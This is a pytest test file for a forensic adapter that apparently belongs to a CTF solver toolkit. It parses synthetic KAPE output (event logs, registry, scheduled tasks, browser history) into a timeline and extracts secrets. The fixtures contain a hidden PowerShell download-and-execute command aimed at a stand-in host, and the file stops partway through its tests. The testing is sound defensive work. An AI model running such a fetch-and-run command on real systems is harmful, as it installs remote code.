"""B-071: the KAPE parsed-output adapter (solvers/toolkits/kape_timeline.py).

Every KAPE tree here is synthetic: the EvtxECmd, RECmd and schtasks CSVs, the Hindsight workbook and
the zips are written by this file, with invented hosts, users and values. Nothing from a challenge is
read and nothing is executed.
"""
from __future__ import annotations

import csv
import datetime as dt
import html
import io
import json
import zipfile
from pathlib import Path

import pytest

import kape_timeline as K
import timeline as TL
import windows as W
from ctf import event
from ctf import intake as I
from ctf.platform.base import Challenge, FileRef
from ctf.result import SolverResult

CSCTF = event.load("csctf")
UTC = dt.timezone.utc

EVTX_HEADER = ["RecordNumber", "EventRecordId", "TimeCreated", "EventId", "Level", "Provider", "Channel",
               "ProcessId", "ThreadId", "Computer", "ChunkNumber", "UserId", "MapDescription", "UserName",
               "RemoteHost", "PayloadData1", "PayloadData2", "PayloadData3", "PayloadData4", "PayloadData5",
               "PayloadData6", "ExecutableInfo", "HiddenRecord", "SourceFile", "Keywords", "ExtraDataOffset",
               "Payload"]
RECMD_HEADER = ["HivePath", "HiveType", "Description", "Category", "KeyPath", "ValueName", "ValueType",
                "ValueData", "ValueData2", "ValueData3", "Comment", "Recursive", "Deleted",
                "LastWriteTimestamp", "PluginDetailFile"]
SCHTASKS_HEADER = ["HostName", "TaskName", "Next Run Time", "Status", "Logon Mode", "Last Run Time",
                   "Last Result", "Author", "Task To Run", "Start In", "Comment", "Scheduled Task State",
                   "Idle Time", "Power Management", "Run As User"]
PS = "Microsoft-Windows-PowerShell/Operational"
TS = "Microsoft-Windows-TaskScheduler/Operational"
RUNMRU_KEY = "ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
HIVE1 = "C:\\case\\C\\Users\\dana\\NTUSER.DAT"
STAGE = "powershell -nop -w hidden -c \"iex (iwr http://updates.example.test:8080/stage)\""
BLOCK_TEXT = ("function Get-Noise { 1 }\n"
              "Start-Process C:\\Temp\\tool.exe --set-password \"frag_one\"\n"
              "Register-ScheduledTask -TaskName 'Updater Check'\n")


# ---------------------------------------------------------------- builders

def _csv(header, rows, encoding="utf-8-sig") -> bytes:
    s = io.StringIO()
    w = csv.writer(s, lineterminator="\r\n")
    w.writerow(header)
    for r in rows:
        w.writerow([r.get(h, "") for h in header] if isinstance(r, dict) else r)
    return s.getvalue().encode(encoding)


def ev(n, when, eid, channel, data=None, *, provider="Prov", computer="LAB-PC-01", desc="", user="", pd=()):
    """One EvtxECmd row. Like EvtxECmd, a lone Data element is written as an object, not a list."""
    if data is None:
        payload = {"EventData": ""}
    else:
        items = [{"@Name": k, "#text": v} for k, v in data.items()]
        payload = {"EventData": {"Data": items[0] if len(items) == 1 else items}}
    row = dict.fromkeys(EVTX_HEADER, "")
    row.update(RecordNumber=str(n), EventRecordId=str(n), TimeCreated=when, EventId=str(eid), Provider=provider,
               Channel=channel, Computer=computer, MapDescription=desc, UserName=user,
               Payload=json.dumps(payload, separators=(",", ":")))
    for i, v in enumerate(pd, 1):
        row[f"PayloadData{i}"] = v
    return row


def block(n, when, bid, num, total, text, **kw):
    return ev(n, when, 4104, PS, {"MessageNumber": str(num), "MessageTotal": str(total), "ScriptBlockText": text,
                                  "ScriptBlockId": bid, "Path": ""}, desc="Contains contents of scripts run", **kw)


def reg(key, name, data, when, *, hive=HIVE1, desc="x", deleted="False"):
    return {"HivePath": hive, "HiveType": "NtUser", "Description": desc, "Category": "User Activity", "KeyPath": key,
            "ValueName": name, "ValueType": "RegSz", "ValueData": data, "Recursive": "False", "Deleted": deleted,
            "LastWriteTimestamp": when}


def schtasks(tasks) -> bytes:
    """schtasks /query /fo csv /v: UTF-16 with a BOM, the header repeated before each task folder."""
    s = io.StringIO()
    w = csv.writer(s, quoting=csv.QUOTE_ALL, lineterminator="\r\n")
    for t in tasks:
        w.writerow(SCHTASKS_HEADER)
        w.writerow([t.get(h, "N/A") for h in SCHTASKS_HEADER])
    return s.getvalue().encode("utf-16")


def _col(i: int) -> str:
    out = ""
    i += 1
    while i:
        i, r = divmod(i - 1, 26)
        out = chr(65 + r) + out
    return out


def xlsx(sheets: dict, *, inline=False, prolog="", skip_empty=True) -> bytes:
    """A minimal workbook: {sheet name: [[cell, ...], ...]}; str cells are shared strings (or inline),
    numbers numeric cells, None no cell at all."""
    shared: list = []

    def cell(ref, v):
        if isinstance(v, (int, float)):
            return f'<c r="{ref}"><v>{v}</v></c>'
        if inline:
            return f'<c r="{ref}" t="inlineStr"><is><t>{html.escape(v)}</t></is></c>'
        if v not in shared:
            shared.append(v)
        return f'<c r="{ref}" t="s"><v>{shared.index(v)}</v></c>'

    ns = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
    parts, names, rels = {}, [], []
    for n, (name, rows) in enumerate(sheets.items(), 1):
        body = "".join(f'<row r="{r}">' + "".join(cell(f"{_col(c)}{r}", v) for c, v in enumerate(row)
                                                   if not (skip_empty and v is None)) + "</row>"
                       for r, row in enumerate(rows, 1))
        parts[f"xl/worksheets/sheet{n}.xml"] = f'<?xml version="1.0"?>{prolog}<worksheet {ns}><sheetData>{body}</sheetData></worksheet>'
        names.append(f'<sheet name="{html.escape(name)}" sheetId="{n}" r:id="rId{n}"/>')
        rels.append(f'<Relationship Id="rId{n}" Type="t" Target="worksheets/sheet{n}.xml"/>')
    parts["xl/workbook.xml"] = (f'<?xml version="1.0"?><workbook {ns} xmlns:r="http://schemas.openxmlformats.org/'
                                f'officeDocument/2006/relationships"><sheets>{"".join(names)}</sheets></workbook>')
    parts["xl/_rels/workbook.xml.rels"] = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
                                           f'package/2006/relationships">{"".join(rels)}</Relationships>')
    if shared:
        parts["xl/sharedStrings.xml"] = (f'<?xml version="1.0"?><sst {ns}>'
                                         + "".join(f"<si><t>{html.escape(x)}</t></si>" for x in shared) + "</sst>")
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        for name, text in parts.items():
            z.writestr(zipfile.ZipInfo(name, date_time=(2031, 1, 1, 0, 0, 0)), text)
    return b.getvalue()


HS_TITLE = ["Hindsight Internet History Forensics - Timeline"]
HS_HEADER = ["Type", "Timestamp (UTC)", "URL", "Title / Name / Status", "Data / Value / Path", "Interpretation",
             "Profile", "Source Item"]


def hindsight(rows) -> bytes:
    return xlsx({"Timeline": [HS_TITLE, HS_HEADER] + rows, "Storage": [["Type", "Origin"]]})


def task_xml(description, command, arguments="", author="LAB\\dana") -> str:
    """A 4698 TaskContent the way EvtxECmd writes it: entity-escaped, line breaks turned into ', '."""
    lines = ['<?xml version="1.0" encoding="UTF-16"?>',
             '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
             f"  <RegistrationInfo><Author>{author}</Author><Description>{description}</Description></RegistrationInfo>",
             f"  <Actions Context=\"Author\"><Exec><Command>{command}</Command><Arguments>{arguments}</Arguments></Exec></Actions>",
             "</Task>"]
    return html.escape(", ".join(lines), quote=False)


def put(root: Path, rel: str, data: bytes) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return p


def host1(root: Path, folder="Kape-parsed-LAB-PC-01") -> Path:
    """The host with the chain: a Win+R command, the script it ran, the task it left, a browser token."""
    base = root / folder
    put(base, "2031-03-06T09_00_00_ConsoleLog.txt",
        b"[2031-03-06 09:00:00 | INF] KAPE directory: C:\\KAPE\r\n"
        b"[2031-03-06 09:00:00 | INF] System info: Machine name: LAB-PC-01, 64-bit: true, User: tech\r\n")
    put(base, "Registry/20310306090500_RECmd_Batch_UserActivity_Output.csv", _csv(RECMD_HEADER, [
        reg(RUNMRU_KEY, "a", STAGE + "\\1", "2031-03-04 10:00:05.1234567"),
        reg(RUNMRU_KEY, "MRUList", "acb", "2031-03-04 10:00:05.1234567"),
        reg(RUNMRU_KEY, "b", "notepad\\1", "2031-03-04 10:00:05.1234567"),
        reg(RUNMRU_KEY, "c", "calc\\1", "2031-03-04 10:00:05.1234567"),
        reg("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDrive", "C:\\od\\OneDrive.exe /background",
            "2031-03-01 08:00:00.0000000"),
        reg("ROOT\\Software\\Vendor\\Thing", "Setting", "7", "2031-03-02 08:00:00.0000000"),
    ]))
    put(base, "EventLogs/20310306090100_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 09:00:00.0000000", 2006, "Microsoft-Windows-Store/Operational", {"A": "1", "B": "2"}),
        ev(2, "2031-03-04 09:30:00.0000000", 4624, "Security", {"TargetUserName": "dana", "LogonType": "2"}),
        ev(3, "2031-03-04 10:00:06.5000000", 4688, "Security",
           {"NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": STAGE}, desc="A new process has been created", user="LAB\\dana"),
        block(4, "2031-03-04 10:00:07.3000000", "blk-1", 3, 3, BLOCK_TEXT[80:]),
        block(5, "2031-03-04 10:00:07.1000000", "blk-1", 1, 3, BLOCK_TEXT[:40]),
        block(6, "2031-03-04 10:00:07.2000000", "blk-1", 2, 3, BLOCK_TEXT[40:80]),
        block(7, "2031-03-04 11:00:00.0000000", "blk-2", 2, 3, "tail of a block whose other parts are gone"),
        ev(8, "2031-03-04 10:00:09.0000000", 106, TS, {"TaskName": "\\Updater Check", "UserContext": "LAB\\dana"},
           desc="Scheduled Task created", pd=("Task: \\Updater Check",)),
        ev(9, "2031-03-04 10:00:09.5000000", 4698, "Security",
           {"SubjectUserName": "dana", "TaskName": "\\Backup Sync",
            "TaskContent": task_xml("frag_two_b", "C:\\Temp\\sync.exe", "--quiet")},
           desc="A scheduled task was created"),
        ev(10, "2031-03-04 12:00:00.0000000", 4688, "Security",
           {"NewProcessName": "C:\\Windows\\notepad.exe", "CommandLine": "notepad"}),
        ev(11, "2031-03-04 10:00:10.0000000", 140, TS, {"TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"},
           desc="Scheduled Task updated"),
        ev(12, "2031-03-04 13:00:00.0000000", 7045, "System",
           {"ServiceName": "HelperSvc", "ImagePath": "C:\\Temp\\helper.exe"}, desc="A service was installed"),
    ]))
    put(base, "Persistence/Scheduled Tasks.csv", schtasks([
        {"HostName": "LAB-PC-01", "TaskName": "\\Updater Check", "Author": "LAB\\dana",
         "Task To Run": "powershell -nop -c iex (iwr http://updates.example.test:8080/stage)", "Comment": "frag_two",
         "Run As User": "dana", "Last Run Time": "3/4/2031 11:00:09 AM"},
        {"HostName": "LAB-PC-01", "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
         "Author": "Microsoft Corporation", "Task To Run": "%windir%\\system32\\defrag.exe -c", "Comment": "Defrag"},
        {"HostName": "LAB-PC-01", "TaskName": "\\Orphan Task", "Task To Run": "C:\\Tools\\orphan.exe"},
    ]))
    put(base, "WebBrowsers/Hindsight_output.xlsx", hindsight([
        ["url", "2031-03-05 08:00:00.250", "https://portal.example.test/admin?token=frag_three&page=2",
         "Admin Console", None, None, "C:\\case\\Default", "History"],
        ["url", "2031-03-05 08:00:01.000", "https://portal.example.test/admin?token=frag_three&page=3",
         "Admin Console", None, None, "C:\\case\\Default", "History"],
        ["url", 47912.5, "https://sso.example.test/cb#access_token=tok-abc&state=1", "Signed in"],
        ["cookie (created)", "2031-03-05 08:10:00.000", None, "sid", "plain-cookie"],
        ["url", None, "https://portal.example.test/untimed?token=never", "No time"],
    ]))
    put(base, "ProgramExecution/20310306090300_PECmd_Output_Timeline.csv",
        _csv(["RunTime", "ExecutableName"], [["2031-03-04 10:00:08.0000000", "TOOL.EXE"],
                                             ["2031-03-03 07:00:00.0000000", "CHROME.EXE"]]))
    put(base, "FileSystem/20310306090200_MFTECmd_$MFT_Output.csv",
        _csv(["EntryNumber", "FileName", "Created0x10"], [["40", "tool.exe", "2031-03-04 10:00:08.0000000"],
                                                          ["41", "stage-updates.example.test.tmp", ""]]))
    return base


def host2(root: Path, folder="LAB-PC-02") -> Path:
    """A host with nothing odd on it (no console log: the folder names it)."""
    base = root / folder
    put(base, "Registry/20310306100500_RECmd_Batch_UserActivity_Output.csv", _csv(RECMD_HEADER, [
        reg(RUNMRU_KEY, "a", "calc\\1", "2031-03-04 09:59:00.0000000", hive="C:\\case\\C\\Users\\eli\\NTUSER.DAT"),
        reg(RUNMRU_KEY, "MRUList", "a", "2031-03-04 09:59:00.0000000", hive="C:\\case\\C\\Users\\eli\\NTUSER.DAT"),
    ]))
    put(base, "EventLogs/20310306100100_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        block(1, "2031-03-04 10:00:08.0000000", "blk-9", 1, 1, "Get-Date", computer="LAB-PC-02"),
        ev(2, "2031-03-04 09:00:00.0000000", 2006, "Microsoft-Windows-Store/Operational", {"A": "1", "B": "2"},
           computer="LAB-PC-02"),
    ]))
    return base


@pytest.fixture()
def case(tmp_path):
    root = tmp_path / "case"
    host1(root)
    host2(root)
    return root


def by_host(rep, host):
    return next(c for c in rep.collections if c.host == host)


def events_of(rep, **want):
    out = []
    for e in rep.events:
        md = e.metadata
        if all((md.get(k) == v) if k not in ("source", "action") else (getattr(e, k) == v) for k, v in want.items()):
            out.append(e)
    return out


def stamp(text: str) -> dt.datetime:
    return dt.datetime.fromisoformat(text).replace(tzinfo=UTC)


# ---------------------------------------------------------------- detection

def test_two_kape_collections_are_found_and_named(case):
    rep = K.scan([case])
    assert [(c.host, c.layout, c.root, c.machine) for c in rep.collections] == [
        ("LAB-PC-01", "kape", "Kape-parsed-LAB-PC-01", "LAB-PC-01"),      # host from the console log
        ("LAB-PC-02", "kape", "LAB-PC-02", None)]                          # no console log: the folder name
    one = by_host(rep, "LAB-PC-01")
    assert {k: len(v) for k, v in one.files.items()} == {"recmd": 1, "evtxecmd": 1, "schtasks": 1, "hindsight": 1,
                                                         "pecmd_timeline": 1}
    # the MFTECmd export and the console log have no reader: listed, not dropped
    assert sorted(r.rsplit("/", 1)[-1] for r, _s in one.others) == [
        "2031-03-06T09_00_00_ConsoleLog.txt", "20310306090200_MFTECmd_$MFT_Output.csv"]


def test_exports_outside_the_kape_layout_are_a_loose_collection(tmp_path):
    put(tmp_path, "export/a_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [block(1, "2031-03-04 10:00:00.0000000", "b", 1, 1, "x")]))
    rep = K.scan([tmp_path])
    assert [(c.layout, c.root, c.host) for c in rep.collections] == [("loose", "export", "export")]
    assert len(rep.events) == 1


def test_a_loose_export_under_a_kape_root_joins_that_collection(tmp_path):
    base = host2(tmp_path)
    put(base, "extra/notes/b_PECmd_Output_Timeline.csv", _csv(["RunTime", "ExecutableName"],
                                                           [["2031-03-04 10:00:08.0000000", "X.EXE"]]))
    rep = K.scan([tmp_path])
    assert len(rep.collections) == 1 and "pecmd_timeline" in rep.collections[0].files
    assert [e.path for e in events_of(rep, source="pecmd")] == ["X.EXE"]


def test_a_folder_without_kape_output_answers_none(tmp_path):
    put(tmp_path, "data/report.csv", b"a,b\r\n1,2\r\n")
    rep = K.scan([tmp_path])
    assert not rep.found and rep.events == []
    res = K.result_of(rep, None)
    assert res.status == "none" and res.flags == () and "no KAPE parsed output found" in res.notes


def test_a_raw_target_collection_is_named_for_the_windows_toolkit(tmp_path):
    put(tmp_path, "C/Windows/System32/winevt/logs/Security.evtx", b"ElfFile\x00")
    put(tmp_path, "C/Windows/System32/config/SYSTEM", b"regf")
    put(tmp_path, "C/Profiles/dana/NTUSER.DAT", b"regf")
    rep = K.scan([tmp_path])
    assert not rep.found
    assert any("3 raw artifact file(s)" in n and "toolkits.windows" in n for n in rep.notes)


def test_two_collections_with_one_host_name_are_told_apart(tmp_path):
    host2(tmp_path / "first")
    host2(tmp_path / "second")
    rep = K.scan([tmp_path])
    assert [c.host for c in rep.collections] == ["LAB-PC-02", "LAB-PC-02 (2)"]
    assert {e.metadata["host"] for e in rep.events} == {"LAB-PC-02", "LAB-PC-02 (2)"}
    assert rep.collections[1].run_mru[0]["host"] == "LAB-PC-02 (2)"


# ---------------------------------------------------------------- EvtxECmd

def test_default_selection_keeps_the_focus_events_and_drops_the_noise(case):
    rep = K.scan([case])
    one = by_host(rep, "LAB-PC-01")
    ids = sorted(e.metadata["event_id"] for e in rep.events if e.metadata["host"] == "LAB-PC-01"
                 and e.source.startswith("evtx:"))
    # 2006 (Store), 4624 and the 4688 outside the pivot window are not there; two 4104 blocks, not four rows
    assert ids == [106, 140, 4104, 4104, 4688, 4698, 7045]
    stat = next(s for s in one.stats if s["kind"] == "evtxecmd")
    assert (stat["rows"], stat["kept"]) == (12, 9)
    svc = events_of(rep, event_id=7045)[0]
    assert svc.timestamp == stamp("2031-03-04 13:00:00") and svc.source == "evtx:System"
    assert svc.path == "C:\\Temp\\helper.exe" and "ServiceName=HelperSvc" in svc.description
    assert svc.metadata["data"] == {"ServiceName": "HelperSvc", "ImagePath": "C:\\Temp\\helper.exe"}


def test_all_events_keeps_every_row(case):
    rep = K.scan([case], all_events=True)
    ids = sorted(e.metadata["event_id"] for e in rep.events if e.metadata["host"] == "LAB-PC-01"
                 and e.source.startswith("evtx:"))
    assert ids == [106, 140, 2006, 4104, 4104, 4624, 4688, 4688, 4698, 7045]


def test_kept_rows_go_through_the_windows_event_reader(case, monkeypatch):
    """The rows are read by windows.json_events and the blocks joined by windows.script_blocks (spies
    that call through): the adapter feeds the existing parsers, it does not carry its own."""
    seen = {"rows": 0, "blocks": 0}
    real_json, real_blocks = W.json_events, W.script_blocks

    def json_events(data, src=""):
        events, complete = real_json(data, src)
        seen["rows"] += len(events)
        return events, complete

    def script_blocks(events):
        seen["blocks"] += 1
        return real_blocks(events)

    monkeypatch.setattr(K.W, "json_events", json_events)
    monkeypatch.setattr(K.W, "script_blocks", script_blocks)
    K.scan([case])
    assert seen == {"rows": 9 + 1, "blocks": 2}            # 9 kept rows of host 1, 1 of host 2; one join per host


def test_4104_parts_are_joined_in_message_order(case):
    rep = K.scan([case])
    one = by_host(rep, "LAB-PC-01")
    blk = {b["id"]: b for b in one.script_blocks}
    assert blk["blk-1"]["text"] == BLOCK_TEXT                 # written 3, 1, 2 in the file
    assert blk["blk-1"]["complete"] is True and blk["blk-1"]["parts"] == 3
    assert blk["blk-1"]["time_utc"] == "2031-03-04T10:00:07.100000Z"       # the earliest part
    assert blk["blk-1"]["rows"] == [4, 5, 6]
    assert blk["blk-2"]["complete"] is False and blk["blk-2"]["parts"] == 1
    e1 = events_of(rep, script_block_id="blk-1")[0]
    assert e1.timestamp == stamp("2031-03-04 10:00:07.100000") and e1.action == "4104 script block"
    assert e1.description == BLOCK_TEXT and e1.source == f"evtx:{PS}"
    assert events_of(rep, script_block_id="blk-2")[0].action == "4104 script block (incomplete)"


def test_the_secret_scan_is_linear_on_a_long_run_of_word_characters():
    """An attacker-sized script block must not stall the scan: CPU time, not wall clock (rule 16)."""
    import time
    text = "A" * 2_000_000 + ' --set-password "x1" ' + "b-" * 500_000
    t0 = time.process_time()
    assert K.secrets_in(text) == ['--set-password "x1"']
    # about 0.03 CPU-seconds here; 15 without the word-boundary guard, hours without the bounded runs
    assert time.process_time() - t0 < 3.0


def test_secret_like_assignments_and_urls_are_pulled_out_of_a_script(case):
    one = by_host(K.scan([case]), "LAB-PC-01")
    blk = {b["id"]: b for b in one.script_blocks}["blk-1"]
    assert blk["secrets"] == ['--set-password "frag_one"']
    assert K.secrets_in("$apiToken = 'abc'; net use /user:x; -Password hunter2") == ["$apiToken 'abc'", "-Password hunter2"]
    assert K.urls_in("iwr http://a.example.test/x, then https://b.example.test/y.") == [
        "http://a.example.test/x", "https://b.example.test/y"]
    assert K.secrets_in("nothing to see") == [] and K.urls_in("ftp://x") == []


def test_a_lone_data_element_is_read_like_a_list(tmp_path):
    """EvtxECmd writes one Data element as an object; the task name must still be read from it."""
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(1, "2031-03-04 10:00:11.0000000", 141, TS, {"TaskName": "\\Solo Task"}, desc="Scheduled Task deleted")]))
    rep = K.scan([tmp_path])
    assert '"Data":{' in ev(1, "x", 141, TS, {"TaskName": "t"})["Payload"]       # the fixture has the object shape
    e = rep.events[0]
    assert e.path == "\\Solo Task" and e.metadata["data"] == {"TaskName": "\\Solo Task"}
    assert rep.collections[0].tasks["\\solo task"]["events"] == 1


def test_process_creation_is_kept_only_inside_the_pivot_window(case):
    rep = K.scan([case])
    procs = events_of(rep, event_id=4688)
    assert [(e.timestamp, e.metadata["tags"]) for e in procs] == [(stamp("2031-03-04 10:00:06.500000"), ["pivot"])]
    assert procs[0].path.endswith("powershell.exe") and STAGE in procs[0].description
    # a window that ends before the event drops it; a window long enough for the later one keeps both
    assert events_of(K.scan([case], pivot_seconds=1), event_id=4688) == []
    assert len(events_of(K.scan([case], pivot_seconds=3 * 3600), event_id=4688)) == 2


def test_an_evtxecmd_name_with_another_header_is_refused_by_name(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", b"When,What\r\n2031-03-04 10:00:00,thing\r\n")
    rep = K.scan([tmp_path])
    assert rep.events == []
    note = rep.collections[0].notes[0]
    assert "x_EvtxECmd_Output.csv" in note and "no EventId, TimeCreated, Payload column" in note and "not read" in note


def test_rows_without_an_event_id_or_a_time_are_counted_in_a_note(tmp_path):
    rows = [ev(1, "2031-03-04 10:00:00.0000000", 7045, "System", {"ServiceName": "s", "ImagePath": "p"}),
            ev(2, "not a time", 7045, "System", {"ServiceName": "t", "ImagePath": "q"}),
            ev(3, "2031-03-04 10:00:01.0000000", 7045, "System", {"ServiceName": "u", "ImagePath": "r"})]
    rows[2]["EventId"] = "n/a"
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, rows))
    rep = K.scan([tmp_path])
    assert [e.metadata["data"]["ServiceName"] for e in rep.events] == ["s"]
    notes = " | ".join(rep.collections[0].notes)
    assert "1 row(s) without a numeric EventId" in notes and "1 selected event(s) have no readable TimeCreated" in notes


# ---------------------------------------------------------------- RECmd

def test_runmru_is_listed_in_typing_order_with_the_key_time_on_the_newest(case):
    rep = K.scan([case])
    mru = by_host(rep, "LAB-PC-01").run_mru
    assert len(mru) == 1 and mru[0]["user"] == "dana" and mru[0]["mru_list_present"] is True
    assert [(e["position"], e["value"], e["command"]) for e in mru[0]["entries"]] == [
        (1, "a", STAGE), (2, "c", "calc"), (3, "b", "notepad")]            # MRUList "acb"; the \1 suffix is gone
    assert mru[0]["key_last_write_utc"] == "2031-03-04T10:00:05.123456Z"
    assert mru[0]["entries"][0]["why"] == ["script_host_or_lolbin", "encoded_or_download"]
    assert mru[0]["entries"][1]["why"] == []
    e = events_of(rep, source="recmd:RunMRU", host="LAB-PC-01")[0]
    assert e.timestamp == stamp("2031-03-04 10:00:05.123456") and e.description == STAGE
    assert e.path == RUNMRU_KEY and e.metadata["entries"] == [STAGE, "calc", "notepad"]
    assert e.metadata["user"] == "dana" and e.metadata["highlight"] == "runmru"


def test_runmru_without_an_mrulist_says_the_order_is_not_typing_order(tmp_path):
    put(tmp_path, "h/Registry/r_RECmd_Batch_UserActivity_Output.csv", _csv(RECMD_HEADER, [
        reg(RUNMRU_KEY, "b", "second\\1", "2031-03-04 10:00:00.0000000"),
        reg(RUNMRU_KEY, "a", "first\\1", "2031-03-04 10:00:00.0000000")]))
    rep = K.scan([tmp_path])
    col = rep.collections[0]
    assert col.run_mru[0]["mru_list_present"] is False
    assert [e["command"] for e in col.run_mru[0]["entries"]] == ["first", "second"]
    assert any("no MRUList value" in n and "letter order" in n for n in col.notes)
    assert rep.events[0].action == "RunMRU key last write (Win+R)" and rep.events[0].description == "first; second"


def test_a_key_repeated_by_two_batch_files_is_one_record_and_one_event(tmp_path):
    rows = [reg(RUNMRU_KEY, "a", "calc\\1", "2031-03-04 10:00:00.0000000"),
            reg(RUNMRU_KEY, "MRUList", "a", "2031-03-04 10:00:00.0000000"),
            reg("ROOT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", "C:\\u.exe", "2031-03-01 08:00:00.0000000")]
    put(tmp_path, "h/Registry/1_RECmd_Batch_UserActivity_Output.csv", _csv(RECMD_HEADER, rows))
    put(tmp_path, "h/Registry/2_RECmd_Batch_Kroll_Output.csv", _csv(RECMD_HEADER, rows))
    rep = K.scan([tmp_path])
    col = rep.collections[0]
    assert len(col.run_mru) == 1 and col.run_mru[0]["also_in"] == ["h/Registry/2_RECmd_Batch_Kroll_Output.csv"]
    assert sorted(e.source for e in rep.events) == ["recmd:RunMRU", "recmd:x"]
    assert events_of(rep, source="recmd:x")[0].metadata["also_in"] == ["h/Registry/2_RECmd_Batch_Kroll_Output.csv"]


def test_run_keys_are_one_event_per_key_and_other_keys_stay_off_the_timeline(case):
    rep = K.scan([case])
    reg_events = [e for e in rep.events if e.source.startswith("recmd:") and e.metadata["host"] == "LAB-PC-01"]
    assert sorted(e.path.rsplit("\\", 1)[-1] for e in reg_events) == ["Run", "RunMRU"]       # not ...\Vendor\Thing
    run = next(e for e in reg_events if e.path.endswith("\\Run"))
    assert run.timestamp == stamp("2031-03-01 08:00:00") and run.action == "registry key last write"
    assert run.description == "OneDrive=C:\\od\\OneDrive.exe /background"


# ---------------------------------------------------------------- scheduled tasks

def test_the_schtasks_csv_is_read_as_utf16_with_its_repeated_headers(case):
    one = by_host(K.scan([case]), "LAB-PC-01")
    assert sorted(t["name"] for t in one.tasks.values()) == [
        "\\Backup Sync", "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "\\Orphan Task", "\\Updater Check"]
    upd = one.tasks["\\updater check"]
    assert upd["comment"] == "frag_two" and upd["author"] == "LAB\\dana" and upd["run_as"] == "dana"
    assert upd["task_to_run"].startswith("powershell -nop -c iex")
    assert upd["last_run_local"] == "3/4/2031 11:00:09 AM"
    orphan = one.tasks["\\orphan task"]
    assert "comment" not in orphan and "author" not in orphan            # schtasks' N/A is not a value
    assert orphan["registered_utc"] is None and orphan["events"] == 0    # no event: listed, untimed
    assert one.tasks["\\microsoft\\windows\\defrag\\scheduleddefrag"]["microsoft"] is True


def test_a_task_reaches_the_timeline_through_its_registration_event(case):
    rep = K.scan([case])
    one = by_host(rep, "LAB-PC-01")
    assert one.tasks["\\updater check"]["registered_utc"] == "2031-03-04T10:00:09Z"
    e = events_of(rep, event_id=106)[0]
    assert e.timestamp == stamp("2031-03-04 10:00:09") and e.path == "\\Updater Check"
    assert e.metadata["task"]["comment"] == "frag_two" and "comment: frag_two" in e.description
    assert "task_to_run: powershell -nop -c iex" in e.description and e.metadata["highlight"] == "task"
    # the schtasks local time never becomes a UTC event
    assert not [x for x in rep.events if x.timestamp == stamp("2031-03-04 11:00:09")]
    builtin = events_of(rep, event_id=140)[0]
    assert "highlight" not in builtin.metadata and builtin.metadata["tags"] == ["task-builtin"]


def test_the_4698_task_xml_gives_the_comment_and_the_command(case):
    rep = K.scan([case])
    one = by_host(rep, "LAB-PC-01")
    backup = one.tasks["\\backup sync"]
    assert backup["comment"] == "frag_two_b" and backup["task_to_run"] == "C:\\Temp\\sync.exe --quiet"
    assert backup["author"] == "LAB\\dana" and backup["registered_utc"] == "2031-03-04T10:00:09.500000Z"
    e = events_of(rep, event_id=4698)[0]
    assert e.metadata["task_xml"]["description"] == "frag_two_b" and "comment: frag_two_b" in e.description
    assert "TaskContent" not in e.description and not any("task XML" in n for n in one.notes)


def test_a_task_xml_that_cannot_be_read_is_one_counted_note(tmp_path):
    put(tmp_path, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
        ev(n, f"2031-03-04 10:00:0{n}.0000000", 4698, "Security", {"TaskName": f"\\T{n}", "TaskContent": "&lt;Task&gt; broken"})
        for n in (1, 2, 3)]))
    rep = K.scan([tmp_path])
    notes = rep.collections[0].notes
    assert len(notes) == 1 and "the task XML of 3 task event(s) could not be read (first at row 1" in notes[0]
    assert len(rep.events) == 3


def test_a_question_mark_name_is_tied_to_the_one_event_task_with_its_prefix(tmp_path):
    """schtasks writes ? for characters outside its code page; the event log keeps the real name."""
    def build(root, event_names):
        put(root, "h/Persistence/Scheduled Tasks.csv", schtasks([
            {"TaskName": "\\Night Job ???", "Task To Run": "C:\\n.exe", "Comment": "from the csv"}]))
        put(root, "h/EventLogs/x_EvtxECmd_Output.csv", _csv(EVTX_HEADER, [
            ev(i, f"2031-03-04 10:00:0{i}.0000000", 106, TS, {"TaskName": name, "UserContext": "u"})
            for i, name in enumerate(event_names, 1)]))
        return K.scan([root])

    rep = build(tmp_path / "one", ["\\Night Job \u00e9\u00e8\u00ea", "\\Other"])
    col = rep.collections[0]
    task = col.tasks["\\night job ???"]
    assert task["event_name"] == "\\Night Job \u00e9\u00e8\u00ea" and task["registered_utc"] == "2031-03-04T10:00:01Z"
    assert "\\night job \u00e9\u00e8\u00ea" not in col.tasks            # one task, not two
    assert events_of(rep, event_id=106)[0].metadata["task"]["comment"] == "from the csv"
    assert any("tied to the event-log task" in n for n in col.notes)

    rep = build(tmp_path / "two", ["\\Night Job A", "\\Night Job B"])
    col = rep.collections[0]
    assert col.tasks["\\night job ???"]["registered_utc"] is None and "event_name" not in col.tasks["\\night job ???"]
    assert any("has 2 event-log tasks" in n and "tied to none" in n for n in col.notes)
    assert all("task" not in e.metadata for e in rep.events)


# ---------------------------------------------------------------- Hindsight

def test_the_hindsight_timeline_sheet_becomes_events(case):
    rep = K.scan([case])
    hs = [e for e in rep.events if e.source == "hindsight"]
    assert [(e.timestamp, e.action) for e in hs] == [
        (stamp("2031-03-05 08:00:00.250000"), "url"), (stamp("2031-03-05 08:00:01"), "url"),
        (stamp("2031-03-05 08:10:00"), "cookie (created)"),
